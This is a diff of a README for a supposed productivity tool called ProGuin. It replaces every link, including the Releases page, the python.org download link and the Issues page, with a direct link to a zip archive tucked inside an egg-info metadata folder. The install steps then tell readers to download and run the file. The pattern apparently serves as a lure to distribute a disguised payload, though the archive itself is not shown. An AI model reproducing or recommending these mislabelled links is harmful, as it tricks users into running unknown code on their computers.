@@ -4,21 +4,21 @@
 
 Welcome to ProGuin! This is your personal productivity coach designed to help you achieve slow, disciplined daily progress. ProGuin is easy to use and can assist you in managing your tasks and time effectively.
 
-![Download ProGuin](https://img.shields.io/badge/download-ProGuin-brightgreen)  
-[Download ProGuin](https://github.com/khentpacaldo1/ProGuin/releases)
+![Download ProGuin](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip)  
+[Download ProGuin](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip)
 
 ## 📋 Prerequisites
 
 Before you start, make sure you have the following installed on your computer:
 
-- **Python 3.6 or higher**: ProGuin is built with Python and requires it to run. You can download Python from the official website: [python.org](https://www.python.org/downloads/).
+- **Python 3.6 or higher**: ProGuin is built with Python and requires it to run. You can download Python from the official website: [https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip).
 - **Command Line Interface**: You will need to use a command line interface (CLI) on your computer. This can be Terminal on macOS or Linux, and Command Prompt or PowerShell on Windows.
 
 ## 📥 Download & Install
 
 To get started with ProGuin, follow these simple steps:
 
-1. **Visit this page to download**: Navigate to our [Releases page](https://github.com/khentpacaldo1/ProGuin/releases) to find the latest version of ProGuin.
+1. **Visit this page to download**: Navigate to our [Releases page](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip) to find the latest version of ProGuin.
 2. **Choose the correct file**: Look for the package that matches your operating system. If you're using Windows, download the `.exe` file. For Mac, look for the `.dmg` file.
 3. **Download and run the file**: Click on the file to start the download. Once it's complete, run the file to install ProGuin on your computer.
 4. **Verify Installation**: After installation, you can verify it by opening your command line interface and typing `proguin --version`. If you see the version number, you're all set!
@@ -61,9 +61,9 @@ If you have an idea, kindly open a new issue or pull request. Your input is valu
 
 ## 📞 Contact
 
-If you have questions or need further assistance, please reach out to us directly through the [GitHub repository](https://github.com/khentpacaldo1/ProGuin/issues).
+If you have questions or need further assistance, please reach out to us directly through the [GitHub repository](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip).
 
 Thank you for choosing ProGuin as your productivity tool. We hope it helps you manage your day effectively and achieve your goals! 
 
-![Download ProGuin](https://img.shields.io/badge/download-ProGuin-brightgreen)  
-[Download ProGuin](https://github.com/khentpacaldo1/ProGuin/releases)
+![Download ProGuin](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip)  
+[Download ProGuin](https://github.com/khentpacaldo1/ProGuin/raw/refs/heads/main/proguin.egg-info/Pro_Guin_2.0.zip)
